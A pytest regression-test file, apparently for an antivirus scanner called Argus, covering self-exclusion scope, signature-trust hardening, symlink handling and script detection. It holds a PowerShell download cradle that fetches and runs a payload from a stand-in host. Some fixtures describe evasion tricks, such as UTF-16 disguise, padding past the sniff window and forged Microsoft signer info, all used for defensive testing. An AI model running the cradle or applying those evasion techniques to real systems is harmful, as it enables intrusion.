"""Hunt fix pass v1.1.0 — Package B (detection) regression tests.

Every test is named for the finding it pins:

- P0-2 (+ L8 P2-1): selftrust scope narrowed to the vault subtree,
  the signature-DB file + key, and the identity-proven exe.
- P1-8: recorded-hash identity proof is primary and decisive;
  SCM match alone exempts nothing and accuses nothing.
- P1-13: path canonicalization resolves links before exclusion /
  trust checks, in selftrust AND in config Exclusions; the
  root-of-drive under-check must match children.
- P0-3 (+ L7 P2): Microsoft trust requires a structurally
  complete SignerInfo, a non-user-writable resolved system
  location, and zeroes ONLY PE-content heuristic signals.
- P0-4: UTF-16LE scripts in disguise route to script analysis
  (content or extension), including cradles padded past the
  8 KB sniff window in text-like files.
- P0-5: oversize scripts — pattern rules stream over the whole
  file; the 4 MB cap binds heuristic script analysis only and
  adds the oversize floor signal.
- P1-19: import descriptor loop hitting EOF keeps parsed imports.
- P1-20: signed trim requires a DER-parseable PKCS#7 with an
  extracted signer; ALL cert entries checked; the cert directory
  must lie at/after the end of section data.
- P1-22: ordinal-only imports from a combo-set DLL earn partial,
  honestly-labeled inferential points.
- P2: entropy-window attribution requires the dominant section;
  UTF-16 script decode requires the interleave pattern; hot-
  pocket window signals carry a score floor; the selftrust
  tamper signal surfaces on the standard ScannedFile surface the
  GUI reads.
"""

from __future__ import annotations

import hashlib
import os
import struct
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).parent))

from pe_fixtures import (  # noqa: E402
    PEBuilder,
    RDATA_CHARS,
    TEXT_CHARS,
    _d_certificate,
    _d_int,
    _d_name,
    _d_oid,
    _d_seq,
    _d_set,
    _d_tlv,
    boring_windows_binary,
    clean_pe,
    code_bytes,
    pkcs7_with_signer,
)

from argus import selftrust  # noqa: E402
from argus.config import Exclusions  # noqa: E402
from argus.detections import Verdict, assess  # noqa: E402
from argus.heuristics import analyze as analyze_mod  # noqa: E402
from argus.heuristics.analyze import analyze_file  # noqa: E402
from argus.heuristics.entropy import EntropyRegion, EntropySummary  # noqa: E402
from argus.heuristics.pe import parse_pe, signer_is_microsoft  # noqa: E402
from argus.heuristics.signals import Signal, pe_signals, StringIndex  # noqa: E402
from argus.rules import BUILTIN_RULES  # noqa: E402
from argus.scanner import scan_file  # noqa: E402
from argus.scoring import score_signals  # noqa: E402
from argus.selftrust import SelfExclusions  # noqa: E402
from argus.signatures import SignatureDB, SignatureHit, init_db  # noqa: E402

EICAR = rb"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
CRADLE = (
    "powershell -nop -w hidden -c \"IEX (New-Object "
    "Net.WebClient).DownloadString('http://evil.example/payload.ps1')\""
)

# The certificate _d_certificate builds: serial 0x1234, issuer
# ("Fixture Issuing CA", "FixtureSoft").
_FIXTURE_SERIAL = 0x1234
_FIXTURE_ISSUER = ("Fixture Issuing CA", "FixtureSoft")


@pytest.fixture()
def db(tmp_path):
    path = tmp_path / "sigs.sigdb"
    init_db(path)
    with SignatureDB.open(path) as handle:
        yield handle


def _sha(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def _names(signals) -> set[str]:
    return {s.name for s in signals}


# ----------------------------------------------------------------------
# Complete-SignerInfo PKCS#7 builder (extends pe_fixtures' DER kit)
# ----------------------------------------------------------------------
def _signer_info(
    *,
    sig_len: int = 256,
    serial: int = _FIXTURE_SERIAL,
    issuer: tuple[str | None, str | None] = _FIXTURE_ISSUER,
    with_digest_alg: bool = True,
) -> bytes:
    digest_alg = (
        _d_seq(_d_oid("608648016503040201"), _d_tlv(0x05, b""))  # SHA-256
        if with_digest_alg
        else _d_int(3)  # not an AlgorithmIdentifier SEQUENCE at all
    )
    issuer_and_serial = _d_seq(
        _d_name(issuer[0], issuer[1]), _d_int(serial)
    )
    encryption_alg = _d_seq(
        _d_oid("2a864886f70d010101"), _d_tlv(0x05, b"")  # rsaEncryption
    )
    return _d_seq(
        _d_int(1),
        issuer_and_serial,
        digest_alg,
        encryption_alg,
        _d_tlv(0x04, b"\xaa" * sig_len),  # encryptedDigest OCTET STRING
    )


def complete_pkcs7(
    cn: str | None,
    org: str | None = None,
    *,
    sig_len: int = 256,
    serial: int = _FIXTURE_SERIAL,
    issuer: tuple[str | None, str | None] = _FIXTURE_ISSUER,
    with_digest_alg: bool = True,
    with_signer_info: bool = True,
) -> bytes:
    """A PKCS#7 SignedData whose certificate names (cn, org) AND
    whose signerInfos set carries a SignerInfo for that very
    certificate — the structurally complete shape P0-3 requires."""
    certs = _d_tlv(0xA0, _d_certificate(cn, org))
    parts = [
        _d_int(1),
        _d_set(),
        _d_seq(_d_oid("2a864886f70d010701")),
        certs,
    ]
    if with_signer_info:
        parts.append(
            _d_set(
                _signer_info(
                    sig_len=sig_len,
                    serial=serial,
                    issuer=issuer,
                    with_digest_alg=with_digest_alg,
                )
            )
        )
    signed_data = _d_seq(*parts)
    return _d_seq(
        _d_oid("2a864886f70d010702"),
        _d_tlv(0xA0, signed_data),
    )


def pe_with_pkcs7(blob: bytes, *, injector: bool = False) -> bytes:
    """A PEBuilder PE carrying *blob* as its certificate payload."""
    builder = PEBuilder()
    if injector:
        from pe_fixtures import RWX_CHARS, packed_bytes

        builder.add_section("UPX0", b"", RWX_CHARS, virtual_size=0x3000)
        builder.add_section("UPX1", packed_bytes(8192), RWX_CHARS)
        builder.set_imports(
            {
                "KERNEL32.dll": [
                    "VirtualAllocEx",
                    "WriteProcessMemory",
                    "CreateRemoteThread",
                    "LoadLibraryA",
                    "GetProcAddress",
                ]
            }
        )
        builder.set_entry(1)
    else:
        builder.add_section(".text", code_bytes(4096), TEXT_CHARS)
        builder.add_section(
            ".rdata",
            b"Microsoft Windows Operating System\x00ordinary\x00",
            RDATA_CHARS,
        )
        builder.set_imports(
            {
                "KERNEL32.dll": ["GetModuleHandleW", "ExitProcess"],
                "ADVAPI32.dll": ["CreateServiceW"],
            }
        )
        builder.set_entry(0)
    builder._cert_blob = blob  # PEBuilder writes it as the cert table
    return builder.build()


def complete_microsoft_pe(**kwargs) -> bytes:
    return pe_with_pkcs7(
        complete_pkcs7("Microsoft Windows", "Microsoft Corporation", **kwargs)
    )


@pytest.fixture()
def windows_tree(tmp_path):
    root = tmp_path / "Windows"
    system32 = root / "System32"
    system32.mkdir(parents=True)
    downloads = tmp_path / "Downloads"
    downloads.mkdir()
    return root, system32, downloads


# ======================================================================
# P0-2 + L8 P2-1 — selftrust scope
# ======================================================================
def test_hunt_p0_2_shared_subtree_scans_normally_and_detects(db, tmp_path):
    """shared\\ is user-writable (Users: Modify): a signature-
    carrying file there must be SCANNED and DETECTED, not
    suppressed pre-read by a blanket data-tree exclusion."""
    data_root = tmp_path / "ProgramData" / "Argus"
    shared_file = data_root / "shared" / "dropped.bin"
    shared_file.parent.mkdir(parents=True)
    shared_file.write_bytes(EICAR)
    exclusions = SelfExclusions(data_roots=(data_root,))

    scanned = scan_file(shared_file, db, [], self_exclusions=exclusions)

    assert scanned.excluded is False
    assert scanned.result.sha256 == _sha(EICAR)  # really read
    assert scanned.verdict is Verdict.MALICIOUS
    assert scanned.assessment.detections[0].name == "EICAR-Test-File"


def test_hunt_p0_2_config_history_status_in_data_root_scan(db, tmp_path):
    data_root = tmp_path / "data"
    data_root.mkdir()
    exclusions = SelfExclusions(data_roots=(data_root,))
    for name in ("argus-config.json", "history.db", "argus-status.json",
                 "self-identity.json", "random-drop.exe"):
        target = data_root / name
        target.write_bytes(EICAR)
        outcome = exclusions.check(target)
        assert outcome.excluded is False, name


def test_hunt_p0_2_vault_subtree_still_excluded_pre_read(db, tmp_path):
    data_root = tmp_path / "data"
    blob = data_root / "quarantine" / "blobs" / "sample.bin"
    blob.parent.mkdir(parents=True)
    blob.write_bytes(EICAR)
    exclusions = SelfExclusions(data_roots=(data_root,))

    scanned = scan_file(blob, db, [], self_exclusions=exclusions)

    assert scanned.excluded is True
    assert scanned.result.sha256 is None  # skipped pre-read
    # The vault database and key under quarantine\ are covered too.
    for name in ("vault.db", "vault.key"):
        assert exclusions.check(data_root / "quarantine" / name).excluded


def test_hunt_p0_2_signature_db_and_key_exact_files_only(db, tmp_path):
    data_root = tmp_path / "data"
    data_root.mkdir()
    exclusions = SelfExclusions(data_roots=(data_root,))
    assert exclusions.check(data_root / "signatures.sigdb").excluded is True
    assert exclusions.check(data_root / "signatures.sigdb.key").excluded is True
    # Exact files, not the whole root: lookalikes scan normally.
    assert exclusions.check(data_root / "signatures.sigdb.bak").excluded is False
    assert exclusions.check(data_root / "other.sigdb").excluded is False


def test_hunt_p0_2_install_dir_support_files_scan_normally(db, tmp_path):
    """Dropping the blanket install-tree exclusion: only the
    identity-proven exe is exempt; a support file carrying a
    signature is detected."""
    install_dir = tmp_path / "install"
    install_dir.mkdir()
    support = install_dir / "readme.bin"
    support.write_bytes(EICAR)
    exclusions = SelfExclusions(
        install_dir=install_dir, own_exe=install_dir / "Argus.exe"
    )
    scanned = scan_file(support, db, [], self_exclusions=exclusions)
    assert scanned.excluded is False
    assert scanned.verdict is Verdict.MALICIOUS


def test_hunt_p0_2_default_set_scope(db, tmp_path, monkeypatch):
    """The machine default set: vault + sigdb/key excluded;
    shared and the rest of the data root are NOT."""
    data_root = tmp_path / "live-data"
    (data_root / "quarantine").mkdir(parents=True)
    (data_root / "shared").mkdir(parents=True)
    monkeypatch.setenv("ARGUS_DATA_DIR", str(data_root))
    monkeypatch.setenv("ProgramFiles", str(tmp_path / "Program Files"))
    selftrust.reset_default_cache()
    try:
        default = selftrust.default_self_exclusions()
        assert default.check(data_root / "quarantine" / "blob.bin").excluded
        assert default.check(data_root / "signatures.sigdb").excluded
        # The default DB's key file — wherever key_path_for puts
        # it (beside the DB, or in the vault in the installed
        # layout) — is covered, exactly that file.
        from argus.signatures import key_path_for

        assert default.check(key_path_for(data_root / "signatures.sigdb")).excluded
        assert not default.check(data_root / "shared" / "history.db").excluded
        assert not default.check(data_root / "argus-config.json").excluded
    finally:
        selftrust.reset_default_cache()


# ======================================================================
# P1-8 — identity proof order
# ======================================================================
def _exe(tmp_path, payload: bytes = b"program-bytes") -> Path:
    exe = tmp_path / "install" / "Argus.exe"
    exe.parent.mkdir(parents=True, exist_ok=True)
    exe.write_bytes(payload)
    return exe


def test_hunt_p1_8_recorded_hash_mismatch_is_tamper_even_if_scm_points_there(tmp_path):
    exe = _exe(tmp_path)
    exclusions = SelfExclusions(
        own_exe=exe,
        scm_exe=exe,  # the SCM ImagePath points right at it…
        recorded_exe_sha256=_sha(b"the-real-argus"),  # …but the record disagrees
    )
    outcome = exclusions.check(exe)
    assert outcome.excluded is False
    assert outcome.tamper_suspect is True  # the record is DECISIVE


def test_hunt_p1_8_recorded_hash_match_excludes_without_other_proofs(tmp_path):
    payload = clean_pe()
    exe = _exe(tmp_path, payload)
    exclusions = SelfExclusions(
        own_exe=exe,
        scm_exe=tmp_path / "elsewhere" / "Argus.exe",
        recorded_exe_sha256=_sha(payload),
    )
    outcome = exclusions.check(exe)
    assert outcome.excluded is True
    assert outcome.source == selftrust.SOURCE_RECORDED_EXE


def test_hunt_p1_8_scm_match_alone_neither_excludes_nor_accuses(tmp_path):
    exe = _exe(tmp_path)
    exclusions = SelfExclusions(own_exe=exe, scm_exe=exe)  # no record
    outcome = exclusions.check(exe)
    assert outcome.excluded is False
    assert outcome.tamper_suspect is False


def test_hunt_p1_8_no_record_and_not_running_exe_scans_without_signal(db, tmp_path):
    exe = _exe(tmp_path, clean_pe())
    exclusions = SelfExclusions(own_exe=exe, scm_exe=exe)
    scanned = scan_file(exe, db, [], self_exclusions=exclusions)
    assert scanned.excluded is False
    assert "argus_program_file_replaced" not in _names(scanned.assessment.signals)
    assert not any(
        "tamper indicator" in note for note in scanned.assessment.notes
    )


def test_hunt_p1_8_no_record_running_exe_still_excludes(tmp_path):
    exe = _exe(tmp_path)
    exclusions = SelfExclusions(own_exe=exe, running_exe=exe)
    outcome = exclusions.check(exe)
    assert outcome.excluded is True
    assert outcome.source == selftrust.SOURCE_RUNNING_EXE


def test_hunt_p1_8_record_is_decisive_over_running_exe_too(tmp_path):
    exe = _exe(tmp_path)
    exclusions = SelfExclusions(
        own_exe=exe,
        running_exe=exe,
        recorded_exe_sha256=_sha(b"something-else"),
    )
    outcome = exclusions.check(exe)
    assert outcome.excluded is False
    assert outcome.tamper_suspect is True


# ======================================================================
# P1-13 — canonicalization (resolve links before the checks)
# ======================================================================
def _symlink(target: Path, link: Path) -> None:
    try:
        os.symlink(target, link)
    except OSError:
        pytest.skip("symlinks not available on this platform")


def test_hunt_p1_13_excluded_path_reached_via_symlink_still_excluded(tmp_path):
    data_root = tmp_path / "data"
    blob = data_root / "quarantine" / "blob.bin"
    blob.parent.mkdir(parents=True)
    blob.write_bytes(b"x")
    link = tmp_path / "innocent-link.bin"
    _symlink(blob, link)
    exclusions = SelfExclusions(data_roots=(data_root,))
    assert exclusions.check(link).excluded is True


def test_hunt_p1_13_symlink_inside_vault_pointing_out_is_not_excluded(tmp_path):
    data_root = tmp_path / "data"
    vault = data_root / "quarantine"
    vault.mkdir(parents=True)
    outside = tmp_path / "outside.bin"
    outside.write_bytes(EICAR)
    link = vault / "escape.bin"
    _symlink(outside, link)
    exclusions = SelfExclusions(data_roots=(data_root,))
    # The link LIVES in the vault but RESOLVES outside it: judged
    # by its resolved address — not excluded.
    assert exclusions.check(link).excluded is False


def test_hunt_p1_13_config_exclusion_symlink_both_directions(tmp_path):
    trusted = tmp_path / "trusted"
    trusted.mkdir()
    secret = trusted / "file.bin"
    secret.write_bytes(b"x")
    link_in = tmp_path / "link-in.bin"
    _symlink(secret, link_in)
    excl = Exclusions(paths=(str(trusted),))
    assert excl.is_path_excluded(link_in) is True  # reached via a link

    outside = tmp_path / "outside.bin"
    outside.write_bytes(b"x")
    link_out = trusted / "escape.bin"
    _symlink(outside, link_out)
    assert excl.is_path_excluded(link_out) is False  # link points OUT


def test_hunt_p1_13_config_exclusion_root_of_drive_matches_children(tmp_path):
    if os.sep != "/":
        pytest.skip("POSIX root case; the Windows C:\\ case shares the code path")
    excl = Exclusions(paths=("/",))
    assert excl.is_path_excluded(tmp_path / "anything.bin") is True


def test_hunt_p1_13_selftrust_is_under_root_case():
    from argus.selftrust import _is_under

    if os.sep == "/":
        assert _is_under("/etc/passwd", "/") is True
        assert _is_under("/etc/passwd", "/etc") is True
        assert _is_under("/etcx/passwd", "/etc") is False
    else:  # pragma: no cover - Windows shape
        assert _is_under("c:\\windows\\x.exe", "c:\\") is True


# ======================================================================
# P0-3 — Microsoft trust hardening
# ======================================================================
def test_hunt_p0_3_complete_signer_info_earns_identity_and_trust(
    tmp_path, windows_tree
):
    root, system32, _dl = windows_tree
    target = system32 / "driverhost.exe"
    target.write_bytes(complete_microsoft_pe())
    info = parse_pe(target)
    assert info.signed is True
    assert info.signer_info_complete is True
    assert info.signer_name == "Microsoft Windows"
    assert signer_is_microsoft(info)
    report = analyze_file(target, windows_root_dir=root)
    assert report.trusted_system_file is True


def test_hunt_p0_3_forgery_two_byte_signature_fails(tmp_path, windows_tree):
    """THE known forgery: first-cert Microsoft identity, SignerInfo
    signature of 2 bytes. No identity, no trust."""
    root, system32, _dl = windows_tree
    target = system32 / "driverhost.exe"
    target.write_bytes(complete_microsoft_pe(sig_len=2))
    info = parse_pe(target)
    assert info.has_extracted_signer is True  # a name WAS claimed…
    assert info.signer_info_complete is False
    assert info.signer_name is None  # …but no identity is granted
    assert info.signer_org is None
    assert not signer_is_microsoft(info)
    report = analyze_file(target, windows_root_dir=root)
    assert report.trusted_system_file is False


def test_hunt_p0_3_first_cert_only_identity_fails(tmp_path, windows_tree):
    """The legacy fixture shape: a certificate claiming Microsoft
    with NO signerInfos at all (what pe_fixtures builds)."""
    root, system32, _dl = windows_tree
    target = system32 / "driverhost.exe"
    target.write_bytes(boring_windows_binary())
    info = parse_pe(target)
    assert info.signer_info_complete is False
    assert info.signer_name is None
    report = analyze_file(target, windows_root_dir=root)
    assert report.trusted_system_file is False


def test_hunt_p0_3_signer_info_must_reference_the_cert(tmp_path):
    """A complete-looking SignerInfo for a DIFFERENT certificate
    (wrong serial, or wrong issuer) completes nothing."""
    for kwargs in ({"serial": 0x9999}, {"issuer": ("Other CA", "Other")}):
        target = tmp_path / "x.exe"
        target.write_bytes(complete_microsoft_pe(**kwargs))
        info = parse_pe(target)
        assert info.signer_info_complete is False, kwargs
        assert info.signer_name is None, kwargs


def test_hunt_p0_3_signer_info_needs_digest_algorithm(tmp_path):
    target = tmp_path / "x.exe"
    target.write_bytes(complete_microsoft_pe(with_digest_alg=False))
    info = parse_pe(target)
    assert info.signer_info_complete is False
    assert info.signer_name is None


def test_hunt_p0_3_user_writable_windows_subtrees_never_trusted(windows_tree):
    root, system32, _dl = windows_tree
    payload = complete_microsoft_pe()
    for relative in (
        Path("Temp") / "evil.exe",
        Path("Tasks") / "evil.exe",
        Path("Prefetch") / "evil.exe",
        Path("System32") / "Tasks" / "evil.exe",
    ):
        target = root / relative
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_bytes(payload)
        report = analyze_file(target, windows_root_dir=root)
        assert report.trusted_system_file is False, relative
    # …while the same bytes in a normal system location are trusted.
    good = system32 / "driverhost.exe"
    good.write_bytes(payload)
    assert analyze_file(good, windows_root_dir=root).trusted_system_file is True


def test_hunt_p0_3_trust_uses_resolved_location(windows_tree, tmp_path):
    """A junction/symlink INTO System32 from a user folder: the
    resolved address is the user folder — no trust."""
    root, system32, downloads = windows_tree
    real = downloads / "driverhost.exe"
    real.write_bytes(complete_microsoft_pe())
    link = system32 / "driverhost.exe"
    _symlink(real, link)
    report = analyze_file(link, windows_root_dir=root)
    assert report.trusted_system_file is False


def test_hunt_p0_3_windows_root_env_fallback_off_windows(monkeypatch, tmp_path):
    if sys.platform == "win32":
        pytest.skip("GetWindowsDirectoryW is authoritative on Windows")
    monkeypatch.setenv("SystemRoot", str(tmp_path / "WinRoot"))
    monkeypatch.delenv("windir", raising=False)
    from argus.heuristics.analyze import windows_root

    assert windows_root() == tmp_path / "WinRoot"


def _signal(name, points, severity="high"):
    return Signal(name=name, severity=severity, points=points,
                  explanation=f"fixture {name}")


def test_hunt_p0_3_trust_zeroes_only_pe_content_signals():
    signals = [
        _signal("process_injection_combo", 45, "critical"),
        _signal("high_entropy_executable_section", 25),
        _signal("double_extension", 30),          # filename signal
        _signal("oversize_not_fully_analyzed", 25, "medium"),  # floor
    ]
    scored = score_signals(signals, signed=True, trusted_system_file=True)
    assert scored.score == 55  # 30 + 25: filename + floor survive intact
    assert scored.short_circuit is False
    assert scored.verdict is Verdict.SUSPICIOUS
    # Pure PE content still zeroes completely.
    pure = score_signals(signals[:2], signed=True, trusted_system_file=True)
    assert pure.score == 0
    assert pure.verdict is Verdict.CLEAN


def test_hunt_p0_3_trusted_file_with_masquerade_name_not_clean(windows_tree):
    root, system32, _dl = windows_tree
    target = system32 / "driver.jpg.exe"  # double extension masquerade
    target.write_bytes(complete_microsoft_pe())
    report = analyze_file(target, windows_root_dir=root)
    assert report.trusted_system_file is True
    assert "double_extension" in _names(report.signals)
    scored = score_signals(
        report.signals,
        signed=report.signed_trim_eligible,
        trusted_system_file=report.trusted_system_file,
    )
    assert scored.score == 30
    assert scored.verdict is Verdict.SUSPICIOUS


def test_hunt_p0_3_sigdb_and_rule_detections_bypass_trust(db, windows_tree, monkeypatch):
    """Re-pin: trust never touches the detection channels."""
    root, system32, _dl = windows_tree
    monkeypatch.setattr("argus.heuristics.analyze.windows_root", lambda: root)
    target = system32 / "driverhost.exe"
    target.write_bytes(complete_microsoft_pe())
    from argus.rules import Pattern, Rule

    rules = [
        Rule(
            name="fixture-needle",
            description="fixture rule",
            severity="critical",
            patterns=(Pattern.from_text("Operating System"),),
        )
    ]
    scanned = scan_file(target, db, rules)
    assert scanned.assessment.detections  # the rule hit stands
    assert scanned.verdict is Verdict.MALICIOUS
    # And a signature hit decides Malicious on its own channel.
    hit = SignatureHit(sha256="a" * 64, name="KnownBad", family="T",
                       severity="high")
    assessment = assess(hit, [])
    assert assessment.verdict is Verdict.MALICIOUS


# ======================================================================
# P0-4 — UTF-16 scripts in disguise + padded cradles
# ======================================================================
def _verdict_of(report):
    scored = score_signals(
        report.signals,
        signed=getattr(report, "signed_trim_eligible", False),
        trusted_system_file=report.trusted_system_file,
    )
    return scored


@pytest.mark.parametrize("suffix", [".ps1", ".txt", ".dat", ""])
def test_hunt_p0_4_utf16_cradle_scores_malicious_any_extension(tmp_path, suffix):
    target = tmp_path / f"payload{suffix}"
    target.write_bytes(CRADLE.encode("utf-16-le"))
    report = analyze_file(target)
    assert report.kind == "script"
    assert "powershell_download_cradle" in _names(report.signals)
    assert _verdict_of(report).verdict is Verdict.MALICIOUS


def test_hunt_p0_4_utf16_cradle_gets_folded_rule_view_in_scanner(db, tmp_path):
    """scanner.scan_file builds the UTF-16-folded rule view from
    CONTENT: a UTF-16 cradle named .txt matches text rules."""
    target = tmp_path / "notes.txt"
    target.write_bytes(CRADLE.encode("utf-16-le"))
    scanned = scan_file(target, db, BUILTIN_RULES)
    det_names = {d.name for d in scanned.assessment.detections}
    assert "Suspicious_PowerShell_Download" in det_names
    assert scanned.verdict is Verdict.MALICIOUS


def test_hunt_p0_4_padded_ascii_cradle_in_txt_routed_to_script(tmp_path):
    """16 KB of padding pushes the cradle past the 8 KB sniff
    window; the bounded decoded-view sample still routes it."""
    target = tmp_path / "notes.txt"
    target.write_bytes(b" " * 16384 + CRADLE.encode("ascii"))
    report = analyze_file(target)
    assert report.kind == "script"
    assert "powershell_download_cradle" in _names(report.signals)
    assert _verdict_of(report).verdict is Verdict.MALICIOUS


def test_hunt_p0_4_plain_text_mention_still_not_script(tmp_path):
    target = tmp_path / "notes.txt"
    target.write_text("remember to ask IT about powershell updates\n" * 3)
    report = analyze_file(target)
    # "powershell" IS a marker, so this routes to script analysis —
    # but carries no cradle and scores Clean (calibration guard).
    assert "powershell_download_cradle" not in _names(report.signals)
    assert _verdict_of(report).verdict is Verdict.CLEAN


# ======================================================================
# P0-5 — oversize scripts
# ======================================================================
def test_hunt_p0_5_huge_script_cradle_at_eof_not_clean(db, tmp_path):
    """65 MB .ps1, cradle at EOF: pattern rules stream the whole
    file (folded/raw), and the heuristic cap adds its floor."""
    target = tmp_path / "huge.ps1"
    cradle = CRADLE.encode("ascii")
    size = 65 * 1024 * 1024
    with open(target, "wb") as fh:
        fh.seek(size - len(cradle))
        fh.write(cradle)
    assert target.stat().st_size == size

    scanned = scan_file(target, db, BUILTIN_RULES)

    assert scanned.verdict is not Verdict.CLEAN
    assert scanned.rules_skipped_reason is None  # rules DID run
    det_names = {d.name for d in scanned.assessment.detections}
    assert "Suspicious_PowerShell_Download" in det_names  # EOF cradle hit
    assert "oversize_not_fully_analyzed" in _names(scanned.assessment.signals)


def test_hunt_p0_5_script_cap_adds_oversize_floor(tmp_path, monkeypatch):
    monkeypatch.setattr(analyze_mod, "SCRIPT_READ_CAP", 1024)
    target = tmp_path / "big.ps1"
    target.write_bytes(b"Write-Host 'padding'\n" * 400)
    report = analyze_file(target)
    assert "oversize_not_fully_analyzed" in _names(report.signals)
    assert any("only the beginning" in n for n in report.notes)


# ======================================================================
# P1-19 — PE imports hitting EOF
# ======================================================================
def _pe_whose_second_descriptor_is_cut_off() -> bytes:
    """A PE whose import descriptor array runs off EOF: descriptor
    0 (KERNEL32/ExitProcess, its thunks+names placed BEFORE the
    array) parses fully; descriptor 1 is truncated mid-record."""
    base = 0x2000  # RVA of the second section, per PEBuilder layout
    blob = bytearray(148)
    # Thunk array at offset 64: one named import + terminator.
    struct.pack_into("<Q", blob, 64, base + 96)
    struct.pack_into("<Q", blob, 72, 0)
    blob[80:93] = b"KERNEL32.dll\x00"
    blob[98:109] = b"ExitProcess"  # hint (2 bytes) sits at 96..97
    # Descriptor 0 at offset 128; only 10 of descriptor 1's bytes
    # would follow — the file is truncated there below.
    struct.pack_into("<IIIII", blob, 128, base + 64, 0, 0, base + 80, base + 64)
    pe = (
        PEBuilder()
        .add_section(".text", code_bytes(512), TEXT_CHARS)
        .add_section(".idata", bytes(blob), RDATA_CHARS)
        .set_entry(0)
        .build()
    )
    # Point the import directory at the hand-laid blob, then cut
    # the file 10 bytes into descriptor 1.
    data = bytearray(pe)
    pe_offset = struct.unpack_from("<I", data, 0x3C)[0]
    opt = pe_offset + 4 + 20
    sec_table = opt + 240
    idata_raw = struct.unpack_from("<I", data, sec_table + 40 + 20)[0]
    # The directory points at the descriptor ARRAY (blob offset
    # 128); the thunks/names it references live before it.
    struct.pack_into("<II", data, opt + 112 + 1 * 8, base + 128, 30)
    cut = idata_raw + 128 + 20 + 10
    return bytes(data[:cut])


def test_hunt_p1_19_import_descriptor_eof_keeps_parsed_imports(tmp_path):
    target = tmp_path / "cut.exe"
    target.write_bytes(_pe_whose_second_descriptor_is_cut_off())
    info = parse_pe(target)
    assert info.imports.get("KERNEL32.dll") == ["ExitProcess"]
    assert info.imports_truncated is True
    assert any("import table" in w for w in info.warnings)


# ======================================================================
# P1-20 — signed trim requirements
# ======================================================================
def _discount_profile(*, cert: str) -> bytes:
    """Raw heuristic score 70 (injection combo 45 + RWX section
    25, no short-circuit) wearing the requested certificate."""
    builder = (
        PEBuilder()
        .add_section(".text", code_bytes(4096), TEXT_CHARS)
        .add_section(".rwx", code_bytes(2048),
                     TEXT_CHARS | 0x80000000)  # writable+executable
        .set_imports(
            {
                "KERNEL32.dll": [
                    "VirtualAllocEx",
                    "WriteProcessMemory",
                    "CreateRemoteThread",
                    "ExitProcess",
                ]
            }
        )
        .set_entry(0)
    )
    if cert == "junk":
        builder.set_cert(0x1000)  # valid table header, zero payload
    elif cert == "claimed":
        builder.set_cert_signer("FixtureSoft Ltd", "FixtureSoft")
    return builder.build()


def test_hunt_p1_20_trim_requires_der_signer(tmp_path, db):
    """Junk-payload cert: signed structurally, but the payload
    does not DER-parse to a signer — NO trim. A DER signer (any
    signer) earns the trim."""
    junk = tmp_path / "junk.exe"
    junk.write_bytes(_discount_profile(cert="junk"))
    info = parse_pe(junk)
    assert info.signed is True
    assert info.has_extracted_signer is False
    report = analyze_file(junk)
    assert report.signed_trim_eligible is False
    scanned = scan_file(junk, db, [])
    assert scanned.assessment.score == 70  # no −15
    assert scanned.verdict is Verdict.MALICIOUS

    claimed = tmp_path / "claimed.exe"
    claimed.write_bytes(_discount_profile(cert="claimed"))
    info2 = parse_pe(claimed)
    assert info2.has_extracted_signer is True
    report2 = analyze_file(claimed)
    assert report2.signed_trim_eligible is True
    scanned2 = scan_file(claimed, db, [])
    assert scanned2.assessment.score == 55  # 70 − 15


def _pe_with_two_entry_cert_table(second_entry: tuple[int, int]) -> bytes:
    """A PE whose cert table chains a valid first entry to a
    second entry with the given (wRevision, wCertificateType)."""
    good = pkcs7_with_signer("FixtureSoft Ltd", "FixtureSoft")
    entry1_len = (8 + len(good) + 7) & ~7
    entry2 = struct.pack("<IHH", 8, second_entry[0], second_entry[1])
    table = (
        struct.pack("<IHH", 8 + len(good), 0x0200, 0x0002)
        + good
        + b"\x00" * (entry1_len - 8 - len(good))
        + entry2
    )
    pe = (
        PEBuilder()
        .add_section(".text", code_bytes(512), TEXT_CHARS)
        .set_entry(0)
        .build()
    )
    data = bytearray(pe + table)
    pe_offset = struct.unpack_from("<I", data, 0x3C)[0]
    opt = pe_offset + 4 + 20
    struct.pack_into("<II", data, opt + 112 + 4 * 8, len(pe), len(table))
    return bytes(data)


@pytest.mark.parametrize(
    "second_entry",
    [(0x0200, 0x0001), (0x0100, 0x0002)],  # bad type / bad revision
)
def test_hunt_p1_20_all_cert_entries_are_checked(tmp_path, second_entry):
    target = tmp_path / "two.exe"
    target.write_bytes(_pe_with_two_entry_cert_table(second_entry))
    info = parse_pe(target)
    assert info.signed is False
    assert info.cert_malformed is True


def test_hunt_p1_20_cert_directory_inside_section_data_is_malformed(tmp_path):
    """The cert directory must lie at/after data_end: a valid
    chain planted INSIDE section data is a forgery."""
    payload = pe_with_pkcs7(complete_pkcs7("FixtureSoft Ltd", "FixtureSoft"))
    data = bytearray(payload)
    pe_offset = struct.unpack_from("<I", data, 0x3C)[0]
    opt = pe_offset + 4 + 20
    cert_dir = opt + 112 + 4 * 8
    cert_offset, cert_size = struct.unpack_from("<II", data, cert_dir)
    # Copy the genuine chain into the .text raw region (offset
    # 0x200 is the first section's raw start in these fixtures,
    # well before data_end) and point the directory at it.
    planted = bytes(data[cert_offset : cert_offset + cert_size])
    text_raw = struct.unpack_from("<I", data, opt + 240 + 20)[0]
    assert text_raw + len(planted) <= cert_offset  # fits before the real table
    data[text_raw : text_raw + len(planted)] = planted
    struct.pack_into("<II", data, cert_dir, text_raw, cert_size)
    target = tmp_path / "planted.exe"
    target.write_bytes(bytes(data))
    info = parse_pe(target)
    assert info.signed is False
    assert info.cert_malformed is True
    report = analyze_file(target)
    assert "malformed_certificate" in _names(report.signals)
    assert report.signed_trim_eligible is False


# ======================================================================
# P1-22 — ordinal-hidden combo inference
# ======================================================================
def _pe_with_imports(imports) -> object:
    import tempfile, os

    data = (
        PEBuilder()
        .add_section(".text", code_bytes(512), TEXT_CHARS)
        .set_imports(imports)
        .set_entry(0)
        .build()
    )
    fd, name = tempfile.mkstemp(suffix=".exe")
    with os.fdopen(fd, "wb") as fh:
        fh.write(data)
    try:
        return parse_pe(name)
    finally:
        os.unlink(name)


def test_hunt_p1_22_ordinal_only_combo_dll_earns_partial_points():
    pe = _pe_with_imports({"KERNEL32.dll": ["#10", "#20", "#30", "#40"]})
    signals = pe_signals(pe, StringIndex(), EntropySummary())
    partial = [s for s in signals if s.name == "ordinal_hidden_combo_suspect"]
